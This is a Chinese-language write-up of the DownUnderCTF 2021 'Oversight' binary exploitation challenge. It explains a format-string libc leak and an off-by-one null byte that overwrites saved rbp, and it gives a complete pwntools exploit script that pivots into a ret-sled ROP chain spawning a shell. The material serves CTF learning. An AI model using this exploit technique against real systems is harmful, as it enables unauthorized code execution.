# DownUnderCTF 2021 - Oversight

## 题目简述

程序先把用户给出的整数拼进格式串 `"%%%d$llx"` 并交给 `printf`，形成任意参数槽位泄露；随后允许向 256 字节栈缓冲区读取最多 256 字节。自制读取函数无条件在已读数据末尾补 `\0`，当恰好读满时会向缓冲区外再写一个零字节，覆盖调用者保存的 `rbp` 最低字节。

## 解题过程

格式串只能控制参数索引，不能直接注入 `%n`，但足以泄露地址：

```c
snprintf(fmt_buf, 100, "Your magic number is: %%%d$llx\n", num);
printf(fmt_buf);
```

在提供的二进制和 libc 2.27 环境中，索引 17 对应 `_IO_2_1_stdout_` 指针。泄露值减去偏移 `0x3ec760` 即为 libc 基址。

第二个漏洞位于：

```c
int n_bytes = fread(buffer, 1, len, stdin);
buffer[n_bytes] = '\0';
```

当 `len == n_bytes == 0x100` 时，合法索引只到 `0xff`，`buffer[0x100]` 会把紧邻的保存 `rbp` 低字节清零。函数返回后，外层栈帧取得这个被修改的 `rbp`；其 `leave` 会把 `rsp` 移入刚才填充的 256 字节缓冲区，随后从中执行 ROP。由于低字节归零后的具体落点取决于当次栈地址，可在载荷前部铺设大量单字节 `ret` gadget 作为滑道。

```python
from pwn import p64, remote

io = remote(HOST, PORT)
io.sendlineafter(b"continue\n", b"")
io.sendlineafter(b"number: ", b"17")
io.recvuntil(b"magic number is: ")
stdout_addr = int(io.recvline(), 16)

libc_base = stdout_addr - 0x3EC760
ret = libc_base + 0x8AA
pop_rsi = libc_base + 0x23EEA
pop_rdi = libc_base + 0x215BF
bin_sh = libc_base + 0x1B3E1A
execve = libc_base + 0xE4C00

chain = (
    p64(pop_rsi) + p64(0) +
    p64(pop_rdi) + p64(bin_sh) +
    p64(execve)
)
payload = p64(ret) * ((0x100 - len(chain)) // 8) + chain

io.sendlineafter(b"max 256)? ", b"256")
io.send(payload)
io.clean(timeout=0.5)
io.sendline(b"cat flag.txt")
print(io.recvuntil(b"}").decode(errors="ignore"))
```

成功后得到：

```text
DUCTF{1_sm@LL_0ver5ight=0v3rFLOW}
```

## 方法总结

边界为“最多缓冲区大小”的读取仍可能因手动终止符产生 off-by-one。保存 `rbp` 的单字节部分覆盖虽然不能直接指定完整地址，却可借助栈地址低位和 `leave` 构造概率性 pivot；格式串泄露先消除 ASLR，`ret` sled 再提高落入 ROP 链的容错率。
